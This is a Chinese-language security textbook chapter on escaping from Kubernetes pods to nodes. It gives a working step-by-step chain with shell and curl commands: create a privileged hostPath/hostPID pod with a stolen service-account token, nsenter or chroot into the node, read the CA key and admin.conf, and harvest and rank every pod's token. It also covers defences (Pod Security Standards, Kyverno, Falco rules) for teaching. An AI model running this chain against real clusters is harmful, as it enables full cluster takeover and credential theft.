# Ch 27 — Pod 逃逸到節點：hostPath / hostPID / privileged

> **目標**：理解 K8s 環境中的危險 Pod spec 欄位如何突破容器隔離邊界，掌握從被入侵的 Pod 建立特權 Pod、逃逸到 node 再橫掃所有其他 Pod secret/token 的完整攻擊鏈。
>
> **環境**：minikube 1.33+（`minikube start --driver=docker`）或 kind；自架 kube-goat 可驗證多數場景；需要 cluster-admin 才能建立測試用特權 Pod。

---

## 為什麼需要這一章

Ch 17 教的是 Docker 單機環境的配置類逃逸：攻擊者直接操作 `docker run --privileged` 或掛 `/dev/sda`，邊界就是 host kernel 和 container 的 namespace 邊界。那個場景簡單，攻擊者通常已在 host 上有 Docker socket 或直接執行指令的入口。

K8s 的情況複雜得多，也更常見：

- **攻擊者不在 host**，而是在 cluster 裡的某個受害 Pod——可能是藉由 web 漏洞、dependency 後門、或 CI/CD 管線入侵而拿到的 shell
- **要逃逸到 node**，需要先拿到足夠的 RBAC 能力建立特權 Pod——Ch 26 講了怎麼找到危險 verb（`create pods`、`create deployments`）並利用
- **逃逸成功後的獎品**和 Docker 單機不同：node 上除了 host FS 之外，還有**所有其他 Pod 的 secret 和 token**——kubelet 把這些掛到 `/var/lib/kubelet/pods/` 底下，攻擊者可以一網打盡
- **防禦層也多一層**：K8s 有 Pod Security Standards（PSS）、Admission Controller、Falco 等，不是只靠 OS 層的 seccomp/AppArmor

這章從 Ch 26 的終點接起來：你已經確認自己的 SA（ServiceAccount，服務帳號）有 `create pods`，接下來走完整條路——建特權 Pod、逃進 node、撈光所有 token。

**合法邊界聲明**：本章所有技術只能在你自己擁有或取得明確書面授權的 K8s 環境中操作。在他人 cluster 上未授權執行這些操作在大多數國家是刑事犯罪，在台灣適用《刑法》第 358、360 條。

---

## 先建直覺

K8s 的容器隔離由四道邊界疊起來：

```
┌────────────────────────────────────────────────────────┐
│  K8s Control Plane（API Server / etcd / Scheduler）     │
└────────────────────────────────────────────────────────┘
              │  (RBAC 把關：能不能建 Pod？)
              ▼
┌────────────────────────────────────────────────────────┐
│  Node（Linux Host）                                     │
│  ┌──────────────────────────────────────────────────┐  │
│  │  Pod A（正常配置）                                │  │
│  │   PID ns ─ 獨立                                  │  │
│  │   net ns ─ 獨立                                  │  │
│  │   mount ns ─ 獨立  ←─ 四道牆全在               │  │
│  │   IPC ns ─ 獨立                                  │  │
│  └──────────────────────────────────────────────────┘  │
│                                                         │
│  ┌──────────────────────────────────────────────────┐  │
│  │  Pod B（危險欄位）                                │  │
│  │   hostPID: true  ──► 打破 PID 牆 ──► nsenter     │  │
│  │   hostNetwork: true ──► 打破 net 牆 ──► etcd:2379│  │
│  │   privileged: true ──► 打破 cap 牆 ──► mount /dev│  │
│  │   hostPath: /  ──► 打破 mount 牆 ──► 讀 host FS  │  │
│  │   hostIPC: true ──► 打破 IPC 牆 ──► shmem 存取  │  │
│  └──────────────────────────────────────────────────┘  │
│                                                         │
│  /var/lib/kubelet/pods/<uid>/volumes/                   │
│    kubernetes.io~projected/kube-api-access-*/token      │
│    ← 所有 Pod 的 SA token 都在 node FS 上              │
└────────────────────────────────────────────────────────┘
```

每個危險欄位破一道不同的牆。最致命的組合是三件一起下：`hostPID + hostPath(/) + privileged`——PID 牆破了能 nsenter，mount 牆破了能讀整個 host FS，cap 牆破了能做 mount。這是本章攻擊鏈的核心配置。

---

## 危險 Pod spec 欄位

### 1. `privileged: true`

**機制**：等同 Ch 17 的 `docker run --privileged`。容器取得 Linux 全部 41 個 capability，seccomp profile 設為 unconfined，裝置白名單開放所有 block device。這表示容器內的 root 幾乎等同 node 上的 root。

**危險性**：
- 可執行 `mount /dev/sda1 /mnt`，讀寫 host 磁碟的原始分區
- `CAP_SYS_ADMIN` 讓你可以 `mount --bind`、操作 cgroup hierarchy
- `CAP_SYS_MODULE` 可 `insmod` 惡意核心模組
- 不需要任何其他欄位，單靠 `privileged` 加上 `/dev` 存取就能拿 host FS

**Pod spec**：

```yaml
securityContext:
  privileged: true
```

**最快的逃逸路徑**（在特權容器內）：

```bash
# 列出所有 block devices
lsblk

# 掛 node 的根分區（minikube 通常是 /dev/vda1 或 /dev/sda1）
mkdir -p /mnt/host
mount /dev/vda1 /mnt/host

# 現在可以讀 node 的完整 FS
ls /mnt/host/etc/kubernetes/
# admin.conf  manifests/  pki/

cat /mnt/host/etc/kubernetes/pki/ca.key
# cluster CA 私鑰到手，可以簽任意憑證

# 或者 chroot 進去，拿到 node 的 shell 環境
chroot /mnt/host /bin/bash
```

單靠 `privileged: true` 不掛 hostPath 也能逃逸，只是需要知道正確的 block device 名稱。

---

### 2. `hostPID: true`

**機制**：Pod 內的 PID namespace 和 node 共享。在 Pod 內執行 `ps aux`，會看到 node 上所有 process 包含 kubelet、containerd、其他 Pod 的 process。

**危險性**：只需要 `hostPID`，不需要 `privileged`，就能透過 `nsenter` 完整進入 host namespace——

```bash
# 找 node 上的 init（PID 1）
ps aux | grep -v grep | head -5

# nsenter 進 PID 1 的全部 namespace，拿到 node 上的 root shell
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

為什麼有效：`nsenter` 把自己切換進目標 process 的 namespace。PID 1 是 host 的 init/systemd，它的 mount namespace 就是 host 的 mount namespace，它的 net namespace 就是 host 的 net namespace。執行完這個指令後，你的 shell 雖然還是在那個 Pod 的 cgroup 裡，但看到的 FS 和網路都是 host 的。

**注意**：`nsenter` 通常需要 `CAP_SYS_PTRACE`（正常容器沒有）或 `CAP_SYS_ADMIN`（`privileged` 才給）。單純 `hostPID: true` 不加任何其他設定，容器可能沒有能力 nsenter。實務上這個技術通常和 `privileged: true` 或至少 `securityContext.capabilities.add: [SYS_PTRACE]` 一起用。

**Pod spec**：

```yaml
spec:
  hostPID: true
  containers:
  - name: attacker
    securityContext:
      capabilities:
        add: ["SYS_PTRACE"]
```

**nsenter 後的操作**：

```bash
# nsenter 進 host 之後
hostname   # 顯示 node hostname，確認已在 host namespace

# 讀 kubelet 目錄
ls /var/lib/kubelet/pods/
# 列出 node 上所有 Pod 的 UID

# 讀 API server 憑證
cat /etc/kubernetes/pki/ca.crt

# 直接打 kubelet API（無需 token，因為在 host net ns）
curl -sk https://127.0.0.1:10250/pods | python3 -m json.tool | head -50
```

---

### 3. `hostNetwork: true`

**機制**：Pod 共享 node 的 network namespace。Pod 的網路介面、IP、port binding 全都和 node 一樣。

**危險性**：
- **繞過 NetworkPolicy**：NetworkPolicy 的規則套用在 Pod 的 network namespace 上；`hostNetwork: true` 的 Pod 在 host namespace，NetworkPolicy 不管它
- **連 127.0.0.1 上的服務**：etcd（2379/2380）、kubelet API（10250）、kube-scheduler（10251）、kube-controller-manager（10252）通常只 listen 在 localhost，hostNetwork Pod 可以直連
- **嗅探 node 上的流量**：若同時有 `privileged`，可以用 tcpdump 嗅探 node 上所有容器間的未加密流量

`hostNetwork` 本身不能直接拿 host FS，但配合 `privileged`，它讓你能打到原本不可達的 cluster 內部服務。

**Pod spec**：

```yaml
spec:
  hostNetwork: true
```

**利用場景**：

```bash
# 在 hostNetwork Pod 內，連接 etcd（若無 TLS 認證）
etcdctl --endpoints=http://127.0.0.1:2379 get / --prefix --keys-only

# 打 kubelet 的未認證 read-only port（若 cluster 開了此選項）
curl http://127.0.0.1:10255/pods

# 連 kube-apiserver 健康檢查端點（不需要憑證）
curl https://127.0.0.1:6443/healthz -k
```

---

### 4. `hostPath` 掛載敏感路徑

**機制**：把 node FS 上的任意路徑掛進容器。K8s 不限制 hostPath 能掛什麼路徑（除非有 Admission Controller 或 PSP/PSS 阻擋）。

**高危路徑清單**：

| hostPath | 危險性 |
|----------|--------|
| `/` | 直接掛 node 整個 root FS，chroot 後等同 node root shell |
| `/etc` | 可改 `/etc/cron.d`（排程執行）、`/etc/passwd`（加 root 帳號）、`/etc/ssh/sshd_config` |
| `/var/run/docker.sock` | Docker socket，可建任意容器（Ch 17 場景） |
| `/var/lib/kubelet` | kubelet 工作目錄，含所有 Pod 的 projected volume 和 secret 掛載點 |
| `/etc/kubernetes` | `admin.conf`、`pki/` 目錄含 cluster CA 私鑰 |
| `/root/.ssh` | 可植入 SSH 公鑰達到持久化 |
| `/proc` | 透過 `/proc/sysrq-trigger` 等介面操作 host kernel |

**掛 / 的 Pod spec**：

```yaml
volumes:
- name: host-root
  hostPath:
    path: /
    type: Directory
volumeMounts:
- name: host-root
  mountPath: /host
```

**進 Pod 後的操作**：

```bash
# 讀 cluster 管理員 kubeconfig
cat /host/etc/kubernetes/admin.conf

# 讀 cluster CA 私鑰
cat /host/etc/kubernetes/pki/ca.key

# 撈所有 Pod 的 SA token
ls /host/var/lib/kubelet/pods/
for pod in /host/var/lib/kubelet/pods/*/; do
  echo "=== ${pod} ==="
  find "${pod}volumes/" -name "token" -exec cat {} \; 2>/dev/null
done

# chroot 進 host，等同完整 node shell
chroot /host /bin/bash
```

---

### 5. `hostIPC: true`

**機制**：Pod 共享 node 的 IPC namespace，可以存取 System V 共享記憶體（shmem）、semaphore、message queue，以及 POSIX shmem（`/dev/shm` 上 host 的對應段）。

**危險性**：相比前四個，`hostIPC` 的直接逃逸價值低，但在特定場景有意義：
- PostgreSQL、Redis、某些版本的 memcached 使用 System V shmem 存放熱數據；若這些服務跑在 node 上，`hostIPC` 的容器可以 `ipcs -m` 列出並 attach 這些記憶體區塊，讀取其中的查詢快取或 session 資料
- 可以向 host 上的 process 發送 IPC signal（需要 UID 匹配或 `CAP_KILL`）

**Pod spec**：

```yaml
spec:
  hostIPC: true
```

```bash
# 在 hostIPC 容器內列出 node 上的共享記憶體段
ipcs -m

# 若 PostgreSQL 用 shmem，可能看到 PostgreSQL 的緩衝區
# key        shmid      owner      perms      bytes      nattch     status
# 0x00000000 2097152    postgres   600        56         6
```

`hostIPC` 在 Pod Security Standards 的 Baseline level 被禁止，和 `hostPID`、`hostNetwork` 同級。

---

## 完整攻擊鏈：從低權限 Pod 到 node

### 場景設定

```
攻擊者已控制：default namespace 的低權限 Pod（web-app-xxx）
SA token：web-app-sa 的 token（掛在 /var/run/secrets/kubernetes.io/serviceaccount/token）
已知：Ch 26 的偵察確認 web-app-sa 有 create pods 的能力
目標：逃逸到 node，收集所有 SA token，找到最高權限的那個
```

### 步驟一：確認自己有 `create pods`

在受害 Pod 內：

```bash
# 讀取自己的 SA token 和 API server 位址
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 確認 create pods 的能力
curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SelfSubjectAccessReview",
    "spec": {
      "resourceAttributes": {
        "namespace": "default",
        "verb": "create",
        "resource": "pods"
      }
    }
  }' | python3 -c "import json,sys; r=json.load(sys.stdin); print(r['status']['allowed'])"
# 輸出：true
```

### 步驟二：建立特權逃逸 Pod

把這個 YAML 透過 API 直接 POST（不需要 kubectl，受害 Pod 內直接 curl）：

```yaml
# escape-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: attacker
    image: ubuntu:22.04
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
```

在受害 Pod 內用 curl 建立：

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl -s --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  $APISERVER/api/v1/namespaces/default/pods \
  -X POST \
  -d @escape-pod.yaml

# 確認 Pod 建起來
curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/default/pods/escape-pod \
  | python3 -c "import json,sys; r=json.load(sys.stdin); print(r['status']['phase'])"
# Running
```

### 步驟三：exec 進特權 Pod，建立 node 上的 shell

從 attacker 機器（或透過 API exec endpoint）進入特權 Pod：

```bash
kubectl exec -it escape-pod -- /bin/bash
```

或純 API 路徑（不用 kubectl）：

```bash
# 使用 WebSocket exec API（這裡用 kubectl 示意，原理是 POST 到 /api/v1/namespaces/.../pods/.../exec）
kubectl exec -it escape-pod -n default -- /bin/bash
```

### 步驟四：透過 hostPath 讀取 node 上所有 Pod 的 token

```bash
# 確認 host FS 可讀
ls /host/etc/kubernetes/

# 撈 node 上所有 Pod 的 SA token
for pod_dir in /host/var/lib/kubelet/pods/*/; do
  pod_uid=$(basename "$pod_dir")
  echo ""
  echo "=== Pod UID: $pod_uid ==="
  # projected volume（K8s 1.21+ 預設路徑）
  find "${pod_dir}volumes/kubernetes.io~projected/" \
    -name "token" 2>/dev/null \
    -exec echo "  TOKEN FILE: {}" \; \
    -exec cat {} \; 2>/dev/null
  # 舊版 secret volume（直接 secret 掛載）
  find "${pod_dir}volumes/kubernetes.io~secret/" \
    -name "token" 2>/dev/null \
    -exec echo "  TOKEN FILE: {}" \; \
    -exec cat {} \; 2>/dev/null
done
```

### 步驟五：或者用 nsenter 直接進 node

```bash
# 在特權 Pod 內（有 hostPID + privileged）
# PID 1 就是 node 上的 init/systemd
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# 確認已在 node namespace（不是 container 的 hostname）
hostname
# minikube 或你的 node 名稱

# 直接讀 node 上的 kubelet 目錄
ls /var/lib/kubelet/pods/
```

### 步驟六：識別最高權限的 token

收集到所有 token 後，逐一測試它們能做什麼：

```bash
#!/bin/bash
# check_tokens.sh: 批次測試收集到的 token 權限

APISERVER="https://kubernetes.default.svc"
CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

for token_file in /tmp/tokens/*; do
  TOKEN=$(cat "$token_file")
  echo ""
  echo "=== Testing: $token_file ==="

  # 取得 token 對應的 SA 資訊
  curl -s --cacert "$CA" -H "Authorization: Bearer $TOKEN" \
    "$APISERVER/api/v1/namespaces/kube-system/secrets" \
    -o /dev/null -w "kube-system secrets: HTTP %{http_code}\n"

  # 測試是否能列 cluster-level 資源
  curl -s --cacert "$CA" -H "Authorization: Bearer $TOKEN" \
    "$APISERVER/api/v1/nodes" \
    -o /dev/null -w "list nodes: HTTP %{http_code}\n"

  # 測試最高權限：能否看 cluster-admin 等級的 secret
  curl -s --cacert "$CA" -H "Authorization: Bearer $TOKEN" \
    "$APISERVER/api/v1/namespaces/kube-system/secrets" \
    | python3 -c "import json,sys; d=json.load(sys.stdin); \
      [print('  SECRET:', s['metadata']['name']) for s in d.get('items',[])]" \
    2>/dev/null
done
```

### 步驟七：用最高權限 token 讀 kube-system secrets

一旦找到能讀 `kube-system` secrets 的 token：

```bash
BEST_TOKEN="<你找到的高權限 token>"
CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# 列出 kube-system 所有 secret
curl -s --cacert $CA -H "Authorization: Bearer $BEST_TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets \
  | python3 -c "
import json, sys, base64
d = json.load(sys.stdin)
for s in d.get('items', []):
    name = s['metadata']['name']
    sa = s['metadata'].get('annotations', {}).get('kubernetes.io/service-account.name', '')
    print(f'Secret: {name} (SA: {sa})')
    for k, v in s.get('data', {}).items():
        if k == 'token':
            print(f'  token: {base64.b64decode(v).decode()[:80]}...')
"
```

到這裡，攻擊者已從 default namespace 的低權限 Pod，走到 cluster-admin 等級的 token，整個 cluster 淪陷。

---

## 對比取捨表

| 欄位 | 破哪道牆 | 直接逃逸路徑 | 合法用途 | 風險等級 |
|------|---------|-------------|---------|---------|
| `privileged: true` | capability + seccomp + /dev | mount /dev/sdX → chroot | DaemonSet 需要 iptables、ebpf 掛載 | 極高 |
| `hostPID: true` | PID namespace | nsenter PID 1 → host shell | 節點診斷工具、sysdig 類監控 | 高 |
| `hostNetwork: true` | network namespace | 連 etcd/kubelet 127.0.0.1 服務 | MetalLB、節點網路 DaemonSet | 高 |
| `hostPath: /` | mount namespace | ls /host/etc/kubernetes → 讀 PKI | 節點備份 agent、log shipper | 極高 |
| `hostPath: /etc` | mount namespace（局部） | 改 cron.d / passwd | 節點 config 管理 | 高 |
| `hostPath: /var/lib/kubelet` | mount namespace（局部） | 讀所有 Pod token | kubelet 監控 agent | 高 |
| `hostIPC: true` | IPC namespace | 存取 shmem 中的應用資料 | PostgreSQL 跨容器 shmem | 中 |

這張表有個重要的含義：表格右邊兩欄都有值，代表這些欄位不是純粹的「壞東西」。`hostPID` 對 sysdig、Falco、Datadog Agent 這類 node-level 監控工具是必要的；`hostNetwork` 對 CNI DaemonSet 是必要的。PSS 的設計正是為了在「允許但審計」和「直接禁止」之間找到平衡點。

---

## 踩雷集錦

**1. minikube 的 /dev 設備名稱不是 /dev/sda**

在 minikube with docker driver 環境下，node 本身是跑在 Docker container 裡的 Linux VM，block device 通常是 `/dev/vda` 或 `/dev/sda`，但有時候分區不掛在 `/dev/vda1` 而是整個磁碟沒分區直接掛。用 `lsblk` 先確認，不要直接猜。

**2. nsenter 在沒有 SYS_PTRACE 的容器內會失敗**

純 `hostPID: true` 不加 capability，nsenter 會回 `Operation not permitted`。實際要讓 nsenter 有效，需要 `privileged: true` 或至少 `capabilities.add: [SYS_PTRACE, SYS_ADMIN]`。很多文章只寫 hostPID 就能 nsenter，沒有說清楚這個前提。

**3. K8s 1.21+ 的 projected token 路徑和舊版不同**

K8s 1.21 之後，SA token 改用 projected volume（有效期限），路徑從 `kubernetes.io~secret/` 變成 `kubernetes.io~projected/kube-api-access-<random>/`。撈 token 的腳本要兩條路徑都找，否則在新版 cluster 上什麼都撈不到。此外 projected token 有 expiry（預設 1 小時），撈到後要盡快用。

**4. escape-pod 的 image 在 air-gapped 環境拉不到**

如果 cluster 沒有 internet 存取，`image: ubuntu:22.04` 會 ImagePullBackOff。改用 cluster 內已有的 image（kubectl get pods -A 先看有哪些 image 在跑），或使用 `image: busybox` 等更可能已在 node 上 cache 的小 image。

**5. chroot 後的 /etc/resolv.conf 可能和 host 不同**

chroot 進 host 後，DNS 解析走的是 host 的 resolv.conf，而不是 cluster 的 CoreDNS。`kubernetes.default.svc` 不能解析。要打 API server 需要用 IP 而非 service hostname。IP 可以從 `chroot` 前的 `KUBERNETES_SERVICE_HOST` 環境變數或 `/etc/kubernetes/admin.conf` 的 server 欄位取得。

---

## 進階延伸

### Pod Security Standards（PSS）：K8s 內建的第一道防線

PSS 是 K8s 1.25 正式 GA 的機制，取代了已棄用的 PodSecurityPolicy（PSP）。它定義三個 level：

| Level | 擋什麼 |
|-------|--------|
| **Privileged** | 什麼都不擋（等於沒有 PSS） |
| **Baseline** | 擋 `privileged`、`hostPID`、`hostNetwork`、`hostIPC`、危險 capabilities、HostPath（直接用法） |
| **Restricted** | Baseline 的一切 + 要求 `runAsNonRoot`、禁止特定 volume type、強制 seccomp |

套用 PSS 只需要在 namespace 加 label：

```bash
# 對 default namespace 套用 Restricted level（最嚴格）
kubectl label namespace default \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/enforce-version=latest

# 用 dry-run 先測現有 Pod 有哪些會違反（不阻擋，只警告）
kubectl label namespace default \
  pod-security.kubernetes.io/warn=restricted \
  pod-security.kubernetes.io/warn-version=latest
```

套了 Restricted 之後，本章的 `escape-pod.yaml` 會被 API server 直接拒絕，Pod 建不起來。

**PSS 的限制**：PSS 是 namespace 級別的。`kube-system` namespace 通常跑 privileged DaemonSet（CNI、kube-proxy），不能套 Restricted。這表示如果攻擊者拿到能在 `kube-system` 建 Pod 的能力，PSS 可能幫不了你——這就是 Ch 26 講的「為什麼 kube-system 的 RBAC 更要守緊」。

### Kyverno / OPA Gatekeeper：更細緻的 Admission Control

PSS 的粒度有限，無法說「允許 hostNetwork 但只允許特定 image」。Kyverno 和 OPA Gatekeeper 讓你寫政策規則：

```yaml
# Kyverno ClusterPolicy 範例：禁止掛 / 或 /etc 的 hostPath
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: block-dangerous-hostpath
spec:
  validationFailureAction: Enforce
  rules:
  - name: no-host-root
    match:
      any:
      - resources:
          kinds: [Pod]
    validate:
      message: "hostPath mounting / or /etc is not allowed"
      deny:
        conditions:
          any:
          - key: "{{ request.object.spec.volumes[].hostPath.path | [? contains(@, '/etc') || @ == '/'] | length(@) }}"
            operator: GreaterThan
            value: "0"
```

Ch 35 會展開完整的 Kyverno / OPA 設定。

### Falco：偵測逃逸行為

Falco 在 node 上 hook kernel 事件（syscall 層面），可以偵測容器內的高危操作。針對本章的攻擊手法，幾條有效規則：

```yaml
# 偵測容器內執行 nsenter
- rule: Container nsenter attempt
  desc: nsenter executed inside a container, possible escape attempt
  condition: >
    spawned_process and container and
    proc.name = "nsenter"
  output: "nsenter in container (user=%user.name command=%proc.cmdline container=%container.name image=%container.image.repository)"
  priority: CRITICAL

# 偵測容器內掛載 block device
- rule: Mount block device in container
  desc: mount of block device executed inside container
  condition: >
    spawned_process and container and
    proc.name = "mount" and
    (proc.args contains "/dev/sd" or proc.args contains "/dev/vd")
  output: "Block device mounted in container (user=%user.name command=%proc.cmdline container=%container.name)"
  priority: CRITICAL

# 偵測 chroot in container
- rule: Chroot in container
  desc: chroot executed in container
  condition: >
    spawned_process and container and
    proc.name = "chroot"
  output: "Chroot in container (user=%user.name command=%proc.cmdline container=%container.name image=%container.image.repository)"
  priority: WARNING
```

Falco 的限制：它偵測的是行為發生後的事件，不能阻止。預防還是要靠 PSS + Admission Controller；Falco 是告警層。

### DaemonSet 的合法高權限場景

這些設定不是全錯，而是需要審計。以下是 cluster 內必要的高權限 DaemonSet：

- **CNI plugin**（Flannel、Calico、Cilium）：需要 `hostNetwork: true`，部分需要 `privileged` 來設 iptables / eBPF 程式
- **node-level 監控**（Datadog Agent、Prometheus Node Exporter）：需要 `hostPID: true` 來讀取 /proc 底下每個 process 的 metrics
- **log agent**（Fluentd、Filebeat）：需要 `hostPath` 掛 `/var/log`，讀取 node 和 container log
- **容器 runtime 監控**（Falco 自己）：需要 `privileged` 和 hostPath 掛 `/dev`，才能讀 kernel event

這些 DaemonSet 通常放在 `kube-system` 或專屬 namespace，不應該把建這些 DaemonSet 的 RBAC 能力給一般 namespace 的 SA。

**本段未實測，為理論預期行為**：在嚴格的 Restricted PSS 下，這些合法 DaemonSet 的部署本身也會被擋，需要在它們所在的 namespace 降到 Privileged 或 Baseline level，並搭配 OPA/Kyverno 做更細的 allowlist（只允許特定 image hash 的 Pod 使用這些危險欄位）。實際設定可用 kind 自架驗證，在 `kube-system` namespace 套 warn-only 的 Baseline 先觀察哪些現有 workload 會觸警。

---

## 本章重點整理

- 五個危險欄位各破一道不同的隔離牆：`privileged`（capability/seccomp/dev）、`hostPID`（PID ns）、`hostNetwork`（net ns）、`hostPath`（mount ns）、`hostIPC`（IPC ns）
- 最毒的組合是三件套：`hostPID + privileged + hostPath:/`——既可 nsenter 進 host namespace，又可讀整個 host FS，還可掛 block device
- 攻擊鏈的核心邏輯：`create pods` 的 RBAC 能力 → 建特權 Pod → 進 Pod → 讀 `/host/var/lib/kubelet/pods/` → 撈所有 token → 找最高權限的 → 拿下 cluster
- K8s 1.21+ 的 token 路徑在 `kubernetes.io~projected/`，不在舊的 `kubernetes.io~secret/`，且有 expiry
- PSS Restricted level 可以直接在 API server 層擋掉本章所有危險 Pod spec；Kyverno/OPA 做更細粒度政策；Falco 做行為偵測
- 合法 DaemonSet（CNI、monitoring agent）確實需要這些欄位，管控策略是「特定 namespace + 特定 image allowlist」而不是「全面禁止」

---

## 自我檢核

1. 用 nsenter 進 host 需要哪些前提條件？只有 `hostPID: true` 夠嗎？說明為什麼。
2. 攻擊者在特權 Pod 內執行 `cat /host/etc/kubernetes/pki/ca.key` 拿到了 cluster CA 私鑰，接下來能做什麼？（提示：用這把 key 能簽什麼憑證？）
3. 列出本章的 `escape-pod.yaml` 如果在套了 PSS Baseline 的 namespace 部署，會被拒絕的原因（至少三條）。
4. 在 K8s 1.24 和 K8s 1.22 的 cluster 上，`/var/lib/kubelet/pods/<uid>/volumes/` 的目錄結構有什麼差異？攻擊者怎麼應對？
5. 假設你是 cluster 的防禦者，你的 log agent DaemonSet 需要 `hostPath: /var/log` 和 `hostPath: /var/lib/docker/containers`，但你也不想讓這些 hostPath 被濫用。描述一個讓 DaemonSet 能跑、但普通 namespace 的 Pod 建不了危險 hostPath 的方案。
6. 本章的 token 批次測試腳本用 HTTP 狀態碼 403 vs 200 來判斷 token 的權限。這個方法有什麼盲點？（提示：想想 RBAC 的 namespace scope 和 cluster scope 的差異。）

---

## 延伸閱讀

- **[Kubernetes Pod Security Standards 官方文件](https://kubernetes.io/docs/concepts/security/pod-security-standards/)**：PSS 三個 level 的完整 policy 定義，逐條列出哪些欄位被限制；讀這份文件可以反推所有配置類逃逸向量。
- **[OWASP Kubernetes Security Cheat Sheet](https://cheatsheats.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html)**：從 OWASP 視角整理的 K8s 安全設定清單，含 hostPath、privileged 的防禦建議和範例 PSS label。
- **[Falco 官方規則庫 falco-rules](https://github.com/falcosecurity/rules)**：Falco 社群維護的完整規則清單，`container_escape.yaml` 和 `kubernetes.yaml` 直接對應本章的偵測需求；看規則就能反推哪些行為在生產環境被認定為高危。
- **[NCC Group — Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)**：深入分析 Linux namespace 隔離的可繞過面；本章 nsenter 技術的底層原理在這份報告的 Section 4 有完整推導。

---

→ [Ch 28 — 節點到 cluster-admin：與 cloud IAM 交會（IRSA）](./28-node-to-cluster-admin.md)
